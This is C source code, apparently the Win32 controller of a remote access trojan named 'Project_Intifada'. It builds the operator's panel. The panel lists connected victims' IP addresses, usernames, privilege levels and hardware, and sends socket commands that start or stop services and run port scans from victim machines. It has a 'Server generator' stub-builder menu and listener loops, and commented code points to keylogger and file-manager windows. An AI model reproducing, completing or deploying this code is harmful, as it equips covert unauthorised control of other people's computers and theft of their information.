        case IDC_START_SRVC:
        {
            SendMessage(hList9,LVM_DELETEALLITEMS,0,0);
            SEND.PacketType = START_SERVICE;
            SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
            SendDataKB+=SSizeKB;
            SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
            UpdateStats();

            GetTime();
            sprintf(LTaskName, "%s","Start service");
            sprintf(LStatus, "%s","pass");
            sprintf(LUserName, "%s", MTemp);

            setlog(LTaskName,LUserName,Time,1);
        }
        break;

        case IDC_STOP_SRVC:
        {
            SendMessage(hList9,LVM_DELETEALLITEMS,0,0);
            SEND.PacketType = STOP_SERVICE;
            SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
            SendDataKB+=SSizeKB;
            SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
            UpdateStats();

            GetTime();
            sprintf(LTaskName, "%s","Stop service");
            sprintf(LStatus, "%s","pass");
            sprintf(LUserName, "%s", MTemp);

            setlog(LTaskName,LUserName,Time,1);
        }
        break;

        }
    }
    return TRUE;

    case WM_CLOSE:
    {
        //ExitProcess(0);
        EndDialog(hwndtDlg,0);

        GetTime();
        sprintf(LTaskName, "%s","Close Task Manager");
        sprintf(LStatus, "%s","pass");
        sprintf(LUserName, "%s", MTemp);

        //setlog(LTaskName,LUserName,Time,1);

    }
    return TRUE;

    }
    return FALSE;
}


DWORD WINAPI TaskWindow(LPVOID lpParam)
{

    hwndTask = CreateDialog(tInst,(LPCTSTR)Task_Dlg,NULL,(DLGPROC)Task_DlgProc);
    ShowWindow(hwndTask,SW_SHOW);

    SendMessage(hwndTask, WM_SETICON, ICON_SMALL, (LPARAM)LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON)));
    SendMessage(hwndTask, WM_SETICON, ICON_BIG, (LPARAM)LoadIcon(NULL, MAKEINTRESOURCE(IDI_ICON)));

    MSG msg;
    while(GetMessage(&msg,hwndTask,0,0)==TRUE)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;

}





BOOL CALLBACK PortScan_DlgProc(HWND hwndPSdlg, UINT message, WPARAM wParam, LPARAM lParam)
{


	static BOOL flag=TRUE;


    switch(message)
    {
    case WM_INITDIALOG:
    {

        hList11=GetDlgItem(hwndPSdlg,IDC_LIST11);

        memset(&LvCol2,0,sizeof(LvCol2));                  // Zero Members
        LvCol2.cx=0;                                   // width between each coloum
// Inserting Couloms as much as we want

        ListView_SetExtendedListViewStyle(hList11, exStyles);

        LvCol2.mask=LVCF_TEXT|LVCF_WIDTH/*|LVCF_IMAGE*/;    // Type of mask
        LvCol2.cx=200;                                   // width of column
        LvCol2.pszText="IP";                            // First Header Text
        SendMessage(hList11,LVM_INSERTCOLUMN,0,(LPARAM)&LvCol2); // Insert/Show the coloum
        LvCol2.cx=114;                                   // width of column
        LvCol2.pszText="Port";                            // Next coloum
        SendMessage(hList11,LVM_INSERTCOLUMN,1,(LPARAM)&LvCol2); // ...
        LvCol2.cx=170;                                   // width of column
        LvCol2.pszText="Status";                            // Next coloum
        SendMessage(hList11,LVM_INSERTCOLUMN,2,(LPARAM)&LvCol2); // ...

        LvItem2.mask=LVIF_TEXT|LVIF_IMAGE;   // Text Style
        LvItem2.cchTextMax = 256; // Max size of test
        LvItem2.iItem=0;          // choose item
        LvItem2.iSubItem=0;       // Put in first coluom


    }
    break;


    case WM_COMMAND:
    {
        switch(LOWORD(wParam))
        {

            case IDC_START_SCAN:
            {
               //if(flag)
              // {
                // get start ip and end ip
				SendMessage(GetDlgItem(hwndPSdlg,IDC_IP_START),
					IPM_GETADDRESS,0,(LPARAM)&SEND.StartIp);
				SendMessage(GetDlgItem(hwndPSdlg,IDC_IP_END),
					IPM_GETADDRESS,0,(LPARAM)&SEND.EndIp);
				// get start port and end port
				SEND.StartPort=GetDlgItemInt(hwndPSdlg,
					IDC_START_PORT,
					NULL,
					FALSE);
				SEND.EndPort=GetDlgItemInt(hwndPSdlg,
					IDC_END_PORT,
					NULL,
					FALSE);

                   SendMessage(hList11,LVM_DELETEALLITEMS,0,0);
                   SEND.PacketType = SCAN_PORT;
                   SSizeKB=send(Socket[TargetID],(char*)&SEND,HeadSize2,0);
                   SendDataKB+=SSizeKB;
                   SetStatsDB(SSizeKB,0,0,0,0,0,0,0,0);
                   UpdateStats();

                   GetTime();
                   sprintf(LTaskName, "%s","Scan port");
                   sprintf(LStatus, "%s","pass");
                   sprintf(LUserName, "%s", MTemp);

                   //setlog(LTaskName,LUserName,Time,1);
             //  }

            }
            break;



        }
    }
    return TRUE;


    case WM_CLOSE:
    {
        EndDialog(hwndPSdlg,0);
    }
    break;


    }
    return FALSE;
}


DWORD WINAPI PortScanWindow(LPVOID lpParam)
{
    hwndPScan = CreateDialog(ULSInst,(LPCTSTR)SCAN_PORT_DLG,NULL,(DLGPROC)PortScan_DlgProc);
    ShowWindow(hwndPScan,SW_SHOW);

    SendMessage(hwndPScan, WM_SETICON, ICON_SMALL, (LPARAM)LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON)));
    SendMessage(hwndPScan, WM_SETICON, ICON_BIG, (LPARAM)LoadIcon(NULL, MAKEINTRESOURCE(IDI_ICON)));


    MSG msg;
    while(GetMessage(&msg,hwndPScan,0,0)==TRUE)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;

}





DWORD WINAPI REFRESH_USERS(LPVOID lParam)
{

 Restart:

InitSettings();
 if(strstr(isListening,"YES"))
 {

   /* clock_t endwait;
    endwait = clock() + 15 *CLK_TCK;
    while (clock() < endwait)
    {

    }*/
    Sleep(atoi(RefTimeDB)*60000);
    //Sleep(10000);



            shutdown(ServerSocket,SD_BOTH);
            closesocket(ServerSocket);
            WSACleanup();


            shutdown(UServerSocket,SD_BOTH);
            closesocket(UServerSocket);
            WSACleanup();


            shutdown(FServerSocket,SD_BOTH);
            closesocket(FServerSocket);
            WSACleanup();

            for(int c=0;c<3;c++)
            {
              WSACleanup();
            }

            Count_Connection = -1;
            MClient=0;
            SendMessage(hList,LVM_DELETEALLITEMS,0,0);

            Sleep(1000);

            Listen(hwndMain);
            UtilListen(hwndMain);
            FileListen(hwndMain);

            //MessageBox(NULL,"RESET","",MB_OK);
            goto Restart;
 }
            Sleep(1000);
            goto Restart;

}







BOOL CALLBACK HostInfo_DlgProc(HWND hwndHIdlg, UINT message, WPARAM wParam, LPARAM lParam)
{
    POINT pt;
    RECT  rect,rect2,rect3;

    switch(message)
    {
    case WM_INITDIALOG:
    {

        HICON hAIcon;

        hAIcon = (HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_SAVE2), IMAGE_ICON, 16, 16, 0);
		SendMessage(GetDlgItem(hwndHIdlg, IDC_GRAB_HOSTINFO), STM_SETICON, (WPARAM)hAIcon, (LPARAM)0);

        hAIcon = (HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_CANCELABT), IMAGE_ICON, 16, 16, 0);
		SendMessage(GetDlgItem(hwndHIdlg, IDC_EXIT_HOSTINFO), STM_SETICON, (WPARAM)hAIcon, (LPARAM)0);

		DestroyCaption(hwndHIdlg);

    }
    break;




	case WM_MOUSEMOVE:
    {
        GetCursorPos(&pt);
		GetWindowRect(GetDlgItem(hwndHIdlg, IDC_GRAB_HOSTINFO), &rect);
        GetWindowRect(GetDlgItem(hwndHIdlg, IDC_EXIT_HOSTINFO), &rect2);
        HICON hAIcon;
        //GetWindowRect(GetDlgItem(hwndEDlg, IDC_SOCKINFO), &rect3);


		if(PtInRect(&rect2, pt))
		{
        SetCursor(LoadCursor(NULL, MAKEINTRESOURCE(32649)));
		}


		if(PtInRect(&rect, pt))
		{
        SetCursor(LoadCursor(NULL, MAKEINTRESOURCE(32649)));

        hAIcon = (HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_SAVE), IMAGE_ICON, 16, 16, 0);
		SendMessage(GetDlgItem(hwndHIdlg, IDC_GRAB_HOSTINFO), STM_SETICON, (WPARAM)hAIcon, (LPARAM)0);
		}

		else
		{
        hAIcon = (HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_SAVE2), IMAGE_ICON, 16, 16, 0);
		SendMessage(GetDlgItem(hwndHIdlg, IDC_GRAB_HOSTINFO), STM_SETICON, (WPARAM)hAIcon, (LPARAM)0);
		}
    }
    break;



        case WM_LBUTTONDOWN:
           {
		    GetCursorPos(&pt);
		    GetWindowRect(GetDlgItem(hwndHIdlg, IDC_GRAB_HOSTINFO), &rect);
		    GetWindowRect(GetDlgItem(hwndHIdlg, IDC_EXIT_HOSTINFO), &rect2);


           if(PtInRect(&rect, pt))
		   {

		   }



           else if(PtInRect(&rect2, pt))
		   {
		    EndDialog(hwndHIdlg,0);
		   }


		   else
		   {
		    SendMessage(hwndHIdlg,WM_NCLBUTTONDOWN,HTCAPTION,0);
		   }


           break;
           }



    case WM_COMMAND:
    {
        switch(LOWORD(wParam))
        {




        }
    }
    return TRUE;


    case WM_CLOSE:
    {
        EndDialog(hwndHIdlg,0);
    }
    break;


    }
    return FALSE;
}


DWORD WINAPI HostInfoWindow(LPVOID lpParam)
{
    hwndHInfo = CreateDialog(ULSInst,(LPCTSTR)HOST_INFO_DLG,NULL,(DLGPROC)HostInfo_DlgProc);
    ShowWindow(hwndHInfo,SW_SHOW);

    SendMessage(hwndHInfo, WM_SETICON, ICON_SMALL, (LPARAM)LoadIcon(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ICON)));
    SendMessage(hwndHInfo, WM_SETICON, ICON_BIG, (LPARAM)LoadIcon(NULL, MAKEINTRESOURCE(IDI_ICON)));


    MSG msg;
    while(GetMessage(&msg,hwndHInfo,0,0)==TRUE)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    return 0;

}



int AddSysTrayNotifier(HWND hwnd)
{

//NotifyData.uID = ;
NotifyData.cbSize = sizeof( NOTIFYICONDATA );//NOTIFYICONDATA_V2_SIZE;
NotifyData.hWnd = hwnd;
NotifyData.uFlags = NIF_MESSAGE|NIF_TIP|NIF_ICON;				// Options
NotifyData.hIcon = LoadIcon(MainInst, MAKEINTRESOURCE(IDI_ICON));
NotifyData.uCallbackMessage = SYSTRAY_MSG;

_tcscpy(NotifyData.szTip,_T("Project_Intifada v.1.0.2"));

return Shell_NotifyIcon(NIM_ADD,&NotifyData);


}



int RemoveSysTrayNotifier(HWND hwnd)
{

NotifyData.cbSize = sizeof( NOTIFYICONDATA );//NOTIFYICONDATA_V2_SIZE;
NotifyData.hWnd = hwnd;

return Shell_NotifyIcon ( NIM_DELETE, &NotifyData );			// Delete the icon

}



int SysTrayShowBalloon(HWND hwnd, char* Title, char* Message, int Icon)
{

	NotifyData.cbSize = sizeof( NOTIFYICONDATA );								// Size of structure
	NotifyData.hWnd = hwnd;													// Handle to parent window
	//NotifyData.uID = ;														// Id of the icon
	NotifyData.uFlags = NIF_INFO;												// Options: show balloon
	NotifyData.dwInfoFlags = Icon;												// Icon for the balloon
	NotifyData.uTimeout = 1000;												// Timeout when the balloon dissapear

	lstrcpyn(NotifyData.szInfo, Message, sizeof(NotifyData.szInfo ));			// Message
	lstrcpyn(NotifyData.szInfoTitle, Title, sizeof(NotifyData.szInfoTitle));	// Title

	return Shell_NotifyIcon(NIM_MODIFY, &NotifyData);						// Show balloon
}





BOOL CALLBACK DialogProc(HWND hwndDlg, UINT uMsg, WPARAM wParam, LPARAM lParam)
{
    HICON mIcon;
    POINT pt;
	  RECT rect;

    switch(uMsg)
    {
    case WM_INITDIALOG:
    {



            MyDir();
            InitSettings();


            //CreateThread(NULL, 0,PortScanWindow,(LPVOID)"", 0, &thread);


            GetSockDataBase();

            sprintf(MPort, "%s", getsockDBport1);

    if(strstr(isAutoPort,"OFF"))
    {
            sprintf(UPort, "%s", getsockDBport2);
            sprintf(FPort, "%s", getsockDBport3);
    }


   //DestroyCaption(hwndDlg);

    mIcon = (HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_CANCELABT), IMAGE_ICON, 16, 16, 0);
    SendMessage(GetDlgItem(hwndDlg,IDC_EXT_MAIN ), STM_SETICON, (WPARAM)mIcon, (LPARAM)0);




        INITCOMMONCONTROLSEX icc;

        icc.dwICC = ICC_LISTVIEW_CLASSES;
        icc.dwSize = sizeof(INITCOMMONCONTROLSEX);

        InitCommonControlsEx(&icc);
//InitCommonControls(); // make our tree control to work
//CreateThread(NULL, 0,KeyLogWindow,(LPVOID)lParam, 0,0);
//CreateThread(NULL, 0,FileWindow,(LPVOID)lParam, 0,0);
        HMENU Mmenu,Hmenu,Msubmenu;

        MTabControl = GetDlgItem(hwndDlg,IDC_MainTAB);


        TCITEM tie;
        /*ti.mask = TCIF_TEXT | TCIF_IMAGE; // I'm only having text on the tab
        ti.pszText = "USERS";
        TabCtrl_InsertItem(MTabControl,0,&ti);
        ti.pszText = "SETTINGS";
        TabCtrl_InsertItem(MTabControl,1,&ti);*/

        tie.mask = TCIF_TEXT | TCIF_IMAGE;
        tie.pszText = "Users";

        TabCtrl_InsertItem(GetDlgItem(hwndDlg, IDC_MainTAB), 0, &tie);

        tie.mask = TCIF_TEXT | TCIF_IMAGE;
        tie.pszText = "User log";

        TabCtrl_InsertItem(GetDlgItem(hwndDlg, IDC_MainTAB), 1, &tie);
        TabCtrl_SetCurSel(MTabControl,0);


        tie.mask = TCIF_TEXT | TCIF_IMAGE;
        tie.pszText = "Socket log";

        TabCtrl_InsertItem(GetDlgItem(hwndDlg, IDC_MainTAB), 2, &tie);
        TabCtrl_SetCurSel(MTabControl,0);


        ShowWindow(GetDlgItem(hwndDlg, IDC_LIST ),SW_SHOW);
        ShowWindow(GetDlgItem(hwndDlg, IDC_SETTING1_GRP ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndDlg, IDC_SETTING2_GRP ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndDlg, IDC_STATIC2 ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndDlg, ID_UTILPORT_EDIT ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndDlg, ID_MAINPORT_EDIT ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndDlg, ID_NO_IP_EDIT1 ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndDlg, ID_NO_IP_EDIT2 ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndDlg, IDC_STATIC3 ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndDlg, IDC_STATIC4 ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndDlg, IDC_STATIC5 ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndDlg, IDC_LIST7 ),SW_HIDE);
        ShowWindow(GetDlgItem(hwndDlg, IDC_LIST8 ),SW_HIDE);


        //ShowWindow(GetDlgItem(hwndDlg, ID_NO_IP_EDIT1 ),SW_HIDE);
        g_hbmScrSht = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_SHOT));

        // hwndFile = CreateDialog(fInst,(LPCTSTR)File_Dlg,NULL,(DLGPROC)File_DlgProc);


        HBITMAP hMBitMap  =  LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_WORM));//LoadImage(GetModuleHandle(NULL),MAKEINTRESOURCE(IDB_WORM),IMAGE_BITMAP,140,18,LR_DEFAULTCOLOR);
        HBITMAP hMBitMap2 = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_EXIT));
        HBITMAP hMBitMap3 = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_CFIG));
        HBITMAP hMBitMap4 = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_LISTEN));
        HBITMAP hMBitMap5 = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_STOPLISTEN));
        HBITMAP hMBitMap6 = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_SOCKET));
        HBITMAP hMBitMap7 = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_INFO));
        HBITMAP hMBitMap8 = LoadBitmap(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_ABTICO));



        Mmenu = CreateMenu();
        Hmenu = CreateMenu();

        Msubmenu = CreatePopupMenu();
        AppendMenu(Mmenu,MF_STRING | MF_POPUP,(UINT)Msubmenu,"Options");
        AppendMenu(Msubmenu,MF_STRING | MF_POPUP,(UINT)Hmenu,"Socket");
        SetMenuItemBitmaps(Msubmenu,(UINT)Hmenu,MF_BITMAP,hMBitMap6,hMBitMap6);
        AppendMenu(Hmenu, MF_STRING, ID_MMENU_OPTION_LISTEN,"Listen");
        SetMenuItemBitmaps(Hmenu,ID_MMENU_OPTION_LISTEN,MF_BITMAP,hMBitMap4,hMBitMap4);
        AppendMenu(Hmenu, MF_STRING, ID_MMENU_OPTION_STOP,"Close");
        SetMenuItemBitmaps(Hmenu,ID_MMENU_OPTION_STOP,MF_BITMAP,hMBitMap5,hMBitMap5);
        AppendMenu(Msubmenu, MF_SEPARATOR,IDC_SEP1,"");
        AppendMenu(Msubmenu, MF_STRING, ID_MMENU_OPTION_SETTING,"Settings");
        SetMenuItemBitmaps(Msubmenu,ID_MMENU_OPTION_SETTING,MF_BITMAP,hMBitMap3,hMBitMap3);
        AppendMenu(Msubmenu, MF_SEPARATOR,IDC_SEP1,"");
        AppendMenu(Msubmenu,MF_STRING,ID_EDIT_STUB,"Server generator");
        SetMenuItemBitmaps(Msubmenu,ID_EDIT_STUB,MF_BITMAP,hMBitMap,hMBitMap);
        //AppendMenu(Msubmenu, MF_BITMAP,IDM_MIMG1,(LPCTSTR)hMBitMap);
       // AddBitmapMenu(hwndMain,"test",IDM_MIMG1,0,0,0);
        AppendMenu(Msubmenu, MF_SEPARATOR,IDC_SEP1,"");
        AppendMenu(Msubmenu, MF_STRING, ID_MMENU_EXIT,"Exit");
        SetMenuItemBitmaps(Msubmenu,ID_MMENU_EXIT,MF_BITMAP,hMBitMap2,hMBitMap2);
//AppendMenu(Msubmenu,MF_STRING | MF_POPUP,(UINT)Msubmenu,"Option");
//AppendMenu(Msubmenu, MF_STRING, ID_MMENU_OPTION_SETTING,"Settings");



        Msubmenu = CreatePopupMenu();
        //AppendMenu(Mmenu,MF_STRING | MF_POPUP,(UINT)Msubmenu,"Edit");


        AppendMenu(Mmenu, MF_STRING, IDC_STATISTICS,"Statistics");

        Msubmenu = CreatePopupMenu();
        AppendMenu(Mmenu,MF_STRING | MF_POPUP,(UINT)Msubmenu,"Help");
        AppendMenu(Msubmenu, MF_STRING, ID_MMENU_MANUAL,"How To");
        SetMenuItemBitmaps(Msubmenu,ID_MMENU_MANUAL,MF_BITMAP,hMBitMap8,hMBitMap8);
        AppendMenu(Msubmenu, MF_SEPARATOR,IDC_SEP1,"");
        AppendMenu(Msubmenu, MF_STRING, ID_MMENU_ABOUT,"About");
        SetMenuItemBitmaps(Msubmenu,ID_MMENU_ABOUT,MF_BITMAP,hMBitMap7,hMBitMap7);


        SetMenu(hwndDlg,Mmenu);

     EnableMenuItem(Msubmenu ,ID_MMENU_MANUAL,MF_DISABLED | MF_GRAYED  );


 /*HWND button1 =  GetDlgItem(hwndMain,ID_EDIT_STUB);

             HANDLE hIBitMap = LoadImage(GetModuleHandle(NULL),MAKEINTRESOURCE(IDB_REG_TREE1),IMAGE_BITMAP,18,15,LR_DEFAULTCOLOR);

         SendMessage(button1,MF_SETIMAGE,IMAGE_BITMAP,(LPARAM)hIBitMap);*/



        hStatus = CreateWindowEx(0, STATUSCLASSNAME,
                                 NULL, WS_CHILD | WS_VISIBLE |
                                 SBARS_SIZEGRIP, 0,0,0,0,hwndDlg,
                                 (HMENU) ID_MAIN_STATUS,
                                 GetModuleHandle(NULL), NULL);

        SendMessage(hStatus, SB_SETPARTS, 4, (LPARAM)statwidths);
        //SetDlgItemText(hwndDlg, ID_MAIN_STATUS, "Status:Idle");
        SendMessage(hStatus, SB_SETTEXT, 0, (LPARAM)"Socket:  [Idle]");
        SendMessage(hStatus, SB_SETTEXT, 3, (LPARAM)"Users:  [0]");
//SendMessage(hStatus, SB_SETPARTS, sizeof(statwidths)/sizeof(int), (LPARAM)statwidths);




        hList=GetDlgItem(hwndDlg,IDC_LIST);


        memset(&LvCol,0,sizeof(LvCol));                  // Zero Members
        LvCol.cx=/*0x28*/50;                                   // width between each coloum
// Inserting Couloms as much as we want

        ListView_SetExtendedListViewStyle(hList, exStyles);
        LvCol.mask=LVCF_TEXT|LVCF_WIDTH/*|LVCF_IMAGE*/;    // Type of mask
        LvCol.cx=30;                                   // width of column
        LvCol.pszText="#";                            // First Header Text
        SendMessage(hList,LVM_INSERTCOLUMN,0,(LPARAM)&LvCol); // Insert/Show the coloum
        LvCol.cx=90;                                   // width of column
        LvCol.pszText="IP address";                            // Next coloum
        SendMessage(hList,LVM_INSERTCOLUMN,1,(LPARAM)&LvCol); // ...
        LvCol.cx=130;                                   // width of column
        LvCol.pszText="Computer name";                            // Next coloum
        SendMessage(hList,LVM_INSERTCOLUMN,2,(LPARAM)&LvCol); // ...
        LvCol.cx=170;                                   // width of column
        LvCol.pszText="Operatting system";                            //
        SendMessage(hList,LVM_INSERTCOLUMN,3,(LPARAM)&LvCol); //
        LvCol.cx=120;                                   // width of column
        LvCol.pszText="Username";                            //
        SendMessage(hList,LVM_INSERTCOLUMN,4,(LPARAM)&LvCol); //
        LvCol.cx=100;                                   // width of column
        LvCol.pszText="Previlage";                            //
        SendMessage(hList,LVM_INSERTCOLUMN,5,(LPARAM)&LvCol); //
        LvCol.cx=80;                                   // width of column
        LvCol.pszText="RAM size";                            //
        SendMessage(hList,LVM_INSERTCOLUMN,6,(LPARAM)&LvCol); //
        LvCol.cx=250;                                   // width of column
        LvCol.pszText="Processor";                            //
        SendMessage(hList,LVM_INSERTCOLUMN,7,(LPARAM)&LvCol); // ...same as above
        LvCol.cx=140;                                   // width of column
        LvCol.pszText="Date/Time";                            //
        SendMessage(hList,LVM_INSERTCOLUMN,8,(LPARAM)&LvCol); //
        LvCol.cx=140;                                   // width of column
        LvCol.pszText="Screen resolution";                            //
        SendMessage(hList,LVM_INSERTCOLUMN,9,(LPARAM)&LvCol); //
        LvCol.cx=30;                                   // width of column
        LvCol.pszText="Socket handle";                            //
        SendMessage(hList,LVM_INSERTCOLUMN,10,(LPARAM)&LvCol); //

        memset(&LvItem,0,sizeof(LvItem)); // Zero struct's Members

        LvItem.mask=LVIF_TEXT|LVIF_IMAGE;   // Text Style
        LvItem.cchTextMax = 256; // Max size of test
        LvItem.iItem=0;          // choose item
        LvItem.iSubItem=0;       // Put in first coluom



        MhImageList=ImageList_Create(16,16,ILC_COLOR16,20,30);
        ImageList_SetBkColor(MhImageList,CLR_NONE);// Macro: 16x16:16bit with 2 pics [array]

        hIcon =(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_GREEN), IMAGE_ICON, 16, 16, 0);				  // load the picture from the resource
        ImageList_AddIcon(MhImageList, hIcon);							      // Macro: Attach the image, to the image list
        DeleteObject(hIcon);
        /*MBitMap=(HBITMAP)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_MONITOR), IMAGE_BITMAP, 16, 14, 0);
        ImageList_Add(MhImageList,MBitMap,NULL);
        DeleteObject(MBitMap);*/


        MBitMap=(HBITMAP)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_PASS), IMAGE_BITMAP, 16, 16, 0);
        ImageList_Add(MhImageList,MBitMap,NULL);
        DeleteObject(MBitMap);

        MBitMap = (HBITMAP)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_FAIL), IMAGE_BITMAP, 16, 16, 0);
        ImageList_Add(MhImageList,MBitMap,NULL);
        DeleteObject(MBitMap);


        UTLImageList=ImageList_Create(16,16,ILC_COLOR16,20,30);
        ImageList_SetBkColor(UTLImageList,CLR_NONE);// Macro: 16x16:16bit with 2 pics [array]


        hBitMap=(HBITMAP)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_PASS), IMAGE_BITMAP, 16, 16, 0);
        ImageList_Add(UTLImageList,hBitMap,NULL);
        DeleteObject(hBitMap);




        SockImageList=ImageList_Create(16,16,ILC_COLOR16,20,30);
        ImageList_SetBkColor(SockImageList,CLR_NONE);// Macro: 16x16:16bit with 2 pics [array]

        hBitMap=(HBITMAP)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_PASS), IMAGE_BITMAP, 16, 16, 0);
        ImageList_Add(SockImageList,hBitMap,NULL);
        DeleteObject(hBitMap);

        hBitMap=(HBITMAP)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_FAIL), IMAGE_BITMAP, 16, 16, 0);
        ImageList_Add(SockImageList,hBitMap,NULL);
        DeleteObject(hBitMap);

     /*   SockErrorImageList=ImageList_Create(16,16,ILC_COLOR16,20,30);
        ImageList_SetBkColor(SockErrorImageList,CLR_NONE);// Macro: 16x16:16bit with 2 pics [array]

        hBitMap=(HBITMAP)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_FAIL), IMAGE_BITMAP, 16, 16, 0);
        ImageList_Add(SockErrorImageList,hBitMap,NULL);
        DeleteObject(hBitMap);*/

        hImageList=ImageList_Create(16,16,ILC_COLOR16,2,30);

        hTBitMap=(HBITMAP)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_TREE), IMAGE_BITMAP, 16, 16, 0);
        ImageList_Add(hImageList,hTBitMap,NULL);
        DeleteObject(hTBitMap);


        hTBitMap=(HBITMAP)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_TREE2), IMAGE_BITMAP, 16, 16, 0);
        ImageList_Add(hImageList,hTBitMap,NULL);
        DeleteObject(hTBitMap);



        hTBitMap=(HBITMAP)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_TREE3), IMAGE_BITMAP, 16, 16, 0);
        ImageList_Add(hImageList,hTBitMap,NULL);
        DeleteObject(hTBitMap);


        hTBitMap=(HBITMAP)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_TREE4), IMAGE_BITMAP, 16, 16, 0);
        ImageList_Add(hImageList,hTBitMap,NULL);
        DeleteObject(hTBitMap);


        hTBitMap=(HBITMAP)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_TREE5), IMAGE_BITMAP, 16, 16, 0);
        ImageList_Add(hImageList,hTBitMap,NULL);
        DeleteObject(hTBitMap);


        hTBitMap=(HBITMAP)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_TREE6), IMAGE_BITMAP, 16, 16, 0);
        ImageList_Add(hImageList,hTBitMap,NULL);
        DeleteObject(hTBitMap);


        /*hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_TREE6), IMAGE_ICON, 16, 16, 0);				  // load the picture from the resource
        ImageList_AddIcon(hImageList, hIcon);							      // Macro: Attach the image, to the image list
        DeleteObject(hIcon);*/




HBITMAP hDBitMap;

        DLImageList0=ImageList_Create(16,16,ILC_COLOR16,2,30);

        hDBitMap=(HBITMAP)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_PASS), IMAGE_BITMAP, 16, 16, 0);
        ImageList_Add(DLImageList0,hDBitMap,NULL);
        DeleteObject(hDBitMap);

       // DLImageList1=ImageList_Create(16,16,ILC_COLOR16,2,30);

        hDBitMap=(HBITMAP)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_FAIL), IMAGE_BITMAP, 16, 16, 0);
        ImageList_Add(DLImageList0,hDBitMap,NULL);
        DeleteObject(hDBitMap);




///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

        FImageList=ImageList_Create(16,16,ILC_COLOR16,2,30);
        //ImageList_SetBkColor(FImageList,CLR_NONE);// Macro: 16x16:16bit with 2 pics [array]


        hFBitMap=(HBITMAP)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_UNK), IMAGE_BITMAP, 16, 16, 0);
        ImageList_Add(FImageList,hFBitMap,NULL);
        DeleteObject(hFBitMap);



        hFBitMap=(HBITMAP)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_EXE2), IMAGE_BITMAP, 16, 16, 0);
        ImageList_Add(FImageList,hFBitMap,NULL);
        DeleteObject(hFBitMap);


        hFBitMap=(HBITMAP)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_EXE), IMAGE_BITMAP, 16, 16, 0);
        ImageList_Add(FImageList,hFBitMap,NULL);
        DeleteObject(hFBitMap);



        hFBitMap=(HBITMAP)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_ZIP), IMAGE_BITMAP, 16, 16, 0);
        ImageList_Add(FImageList,hFBitMap,NULL);
        DeleteObject(hFBitMap);


        hFBitMap=(HBITMAP)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_DOC), IMAGE_BITMAP, 16, 16, 0);
        ImageList_Add(FImageList,hFBitMap,NULL);
        DeleteObject(hFBitMap);



        hFBitMap=(HBITMAP)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_IMG), IMAGE_BITMAP, 16, 16, 0);
        ImageList_Add(FImageList,hFBitMap,NULL);
        DeleteObject(hFBitMap);



        hFBitMap=(HBITMAP)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDB_MEDIA), IMAGE_BITMAP, 16, 16, 0);
        ImageList_Add(FImageList,hFBitMap,NULL);
        DeleteObject(hFBitMap);



